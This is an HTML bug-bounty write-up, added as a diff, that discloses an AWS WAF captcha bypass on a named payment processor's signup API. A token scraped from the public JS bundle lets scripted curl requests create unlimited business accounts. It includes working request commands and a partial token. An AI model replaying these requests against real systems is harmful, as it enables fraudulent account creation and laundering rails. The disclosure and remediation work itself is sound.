@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>The WAF That Shipped Its Own Bypass Key — r1gor</title>
+  <link rel="stylesheet" href="../style.css?v=1778427508">
+</head>
+<body>
+<div class="page-frame">
+<span class="corner-bl">&mdash;</span>
+<span class="corner-br">&mdash;</span>
+<header>
+  <div class="container">
+    <div class="site-id">[00.00_r1gor]<br>[00.00_bugbounty]</div>
+    <a href="../" class="site-title">r1gor</a>
+    <div class="bar"><div class="bar-fill"></div><div class="bar-short"></div></div>
+  </div>
+</header>
+<main class="container">
+<hr class="section-rule">
+<a href="../" class="back">all write-ups</a>
+<article>
+<h1>The WAF That Shipped Its Own Bypass Key</h1>
+<canvas id="gen-art" data-seed="10-waf-that-shipped-its-own-bypass-key" width="640" height="200"></canvas>
+<p>----[  Target</p>
+<p>The target is a payment processor licensed under PSD2 in the
+European Union and registered as a Money Services Business with
+FinCEN in the United States. The platform issues IBANs, runs card
+acquiring, and clears SEPA and SWIFT transfers for business
+customers. Two public surfaces matter for this writeup:</p>
+<pre><code>account.paydo.com   - sign up and dashboard SPA
+checkout.paydo.com  - hosted card capture for merchants
+api.paydo.com       - JSON API behind both
+</code></pre>
+<p>The signup endpoint at <code>POST /v1/users/create</code> is the primary onboarding
+gate. Every defense the platform layers on against fake business
+accounts, money mules, and laundering rails sits on top of that
+single endpoint. The chosen control is AWS WAF with a captcha rule
+in front of the route.</p>
+<p>----[  Intended Design</p>
+<p>The flow is the standard AWS WAF JavaScript SDK integration.</p>
+<p>A browser loads the SPA. The SDK initializes with an integration
+token and an endpoint identifier. The SDK transparently solves a
+challenge in the background, obtains a short lived token, and
+attaches that token to outgoing requests as <code>x-aws-waf-token</code>. The
+WAF inspects the token, verifies that the client passed the
+challenge, and forwards the request to the origin. Without a valid
+token the WAF returns a 405 with an HTML challenge body.</p>
+<p>In normal operation the user never sees a captcha. The SDK works
+silently. A scripted client without a browser fails immediately
+because it has no way to obtain a token.</p>
+<p>That is the model. The model presumes that the integration token
+is treated as a tenant identifier, not a secret, and that the
+token issuance flow can only be completed by code that runs in a
+real browser environment.</p>
+<p>----[  The Bug</p>
+<p>The Angular bundle for <code>account.paydo.com</code> is delivered as a single
+file with a content hash in the name:</p>
+<pre><code>GET /main.b3dd9a9e956dba5f.js HTTP/2
+</code></pre>
+<p>A grep through the bundle reveals the integration token embedded as
+a literal string:</p>
+<pre><code>$ curl -sk https://account.paydo.com/main.b3dd9a9e956dba5f.js -o app.js
+$ grep -o 'NG_AWS_WAF_API_KEY&quot;:&quot;[^&quot;]*&quot;' app.js
+NG_AWS_WAF_API_KEY&quot;:&quot;i3M2O+HBr4XUPIn3kNis/tGtS/YP+wI6...&quot;
+</code></pre>
+<p>The same token appears in the <code>checkout.paydo.com</code> bundle under a
+different filename hash. Both bundles are served without
+authentication and are cached by the CDN. The token has no
+expiration encoded in its handling.</p>
+<p>----[  Confirming the Behavior</p>
+<p>A baseline request without any WAF token is rejected:</p>
+<pre><code>$ curl -sk https://api.paydo.com/v1/users/create \
+    -X POST \
+    -H &quot;Content-Type: application/json&quot; \
+    -d '{&quot;email&quot;:&quot;u@app.com&quot;,&quot;password&quot;:&quot;TestPass123&quot;}'
+
+HTTP/2 405
+&lt;html&gt;&lt;body&gt;... AWS WAF challenge page ...&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p>The same request with the token from the bundle passes through:</p>
+<pre><code>$ curl -sk https://api.paydo.com/v1/users/create \
+    -X POST \
+    -H &quot;Content-Type: application/json&quot; \
+    -H &quot;x-aws-waf-token: i3M2O+HBr4XUPIn3kNis/tGtS/YP+wI6...&quot; \
+    -d '{
+      &quot;email&quot;:&quot;attacker+1@app.com&quot;,
+      &quot;password&quot;:&quot;TestPass123&quot;,
+      &quot;businessData&quot;:{&quot;name&quot;:&quot;FraudBiz&quot;},
+      &quot;address&quot;:{&quot;country&quot;:&quot;GB&quot;},
+      &quot;firstName&quot;:&quot;Att&quot;,
+      &quot;lastName&quot;:&quot;est&quot;
+    }'
+
+HTTP/2 202
+</code></pre>
+<p>A loop around the same request creates an arbitrary number of
+business accounts with different email addresses. The WAF does not
+rate limit on the token alone. The application enforces no further
+captcha or proof of work for unauthenticated submissions.</p>
+<p>----[  Why It Works</p>
+<p>The AWS WAF JavaScript SDK is designed for client side use. The
+integration token is meant to identify a tenant of the WAF
+service, not to authenticate a particular browser. The challenge
+output produced by the SDK is the actual proof that a request
+should be trusted. In the documented flow the backend application
+verifies the token issued by the SDK against the WAF token
+validation endpoint before accepting state changing input.</p>
+<p>The platform uses the SDK without that verification step. The
+backend trusts the presence of any value in the <code>x-aws-waf-token</code>
+header and never confirms the token was issued by a real challenge.
+The WAF in turn trusts that any request bearing the integration
+token belongs to the SPA. Two layers each assume the other is
+performing the check that neither performs.</p>
+<p>The integration token is published in two places, both reachable
+without authentication, both cached at the edge. Possession of the
+token is therefore not evidence of anything.</p>
+<p>----[  Impact</p>
+<p>The captcha is the only control the platform applies between the
+public internet and account creation. Defeating it removes the
+last layer of friction in front of automated registration on a
+licensed payment institution. The downstream consequences include:</p>
+<pre><code>o  Mass creation of accounts under fabricated business identities,
+   used to layer transactions through the platform.
+
+o  Defeat of the rate limit that the WAF would otherwise apply
+   per challenge, since every script controls the token directly.
+
+o  Bypass of the regulatory expectation that a strong customer
+   authentication framework starts at the account opening flow.
+
+o  Reuse of the same token against checkout.paydo.com, which
+   exposes additional unauthenticated endpoints to scripted
+   abuse.
+</code></pre>
+<p>The token in the bundle is the integration token for the WAF
+itself. Rotating it requires coordinated changes to two production
+SPAs, the WAF rule, and any third party that embeds the checkout.</p>
+<p>----[  Remediation</p>
+<p>The fix has two parts and neither is novel.</p>
+<p>First, the integration token must be treated as the tenant
+identifier that AWS documents it to be, and the actual token of
+trust must be the value the SDK produces after the challenge is
+solved. The backend at <code>api.paydo.com</code> should call the AWS WAF token
+introspection on every state changing request from the public
+SPAs, and reject any request whose token is missing, expired, or
+not associated with a recent challenge.</p>
+<p>Second, sensitive flows such as account creation should not depend
+on a WAF rule alone. A backend issued nonce, bound to a server
+side challenge response and short lived, places the trust decision
+inside the application boundary instead of on the edge.</p>
+<p>Both changes are configuration and a small amount of code on a
+service that already runs the SDK. Neither requires architectural
+work.</p>
+<p>----[  Closing</p>
+<p>The interesting property of this bug is that both halves of the
+defense were correctly installed. The WAF was provisioned. The SDK
+was wired up. The bundle was minified and served from a CDN. Every
+component performed its job. The control failed because the secret
+that the design depended on was published as a configuration
+constant on the page that it was meant to defend.</p>
+<p>Reported.</p>
+<p>If a defense is delivered inside the page that it is defending,
+the defense and the page have the same threat model.</p>
+</article>
+</main>
+<footer>
+  <div class="container">
+    <div>&copy; 2025 &mdash; responsible disclosure, always.</div>
+    <img src="../email.png" alt="" class="email-img">
+  </div>
+</footer>
+</div>
+<script src="../gen.js?v=1778427508"></script>
+<script>
+document.querySelectorAll('pre').forEach(function(pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'copy';
+  btn.onclick = function() {
+    navigator.clipboard.writeText(pre.querySelector('code').textContent);
+    btn.textContent = 'copied';
+    btn.classList.add('copied');
+    setTimeout(function() { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
+  };
+  pre.appendChild(btn);
+});
+</script>
+</body>
+</html>
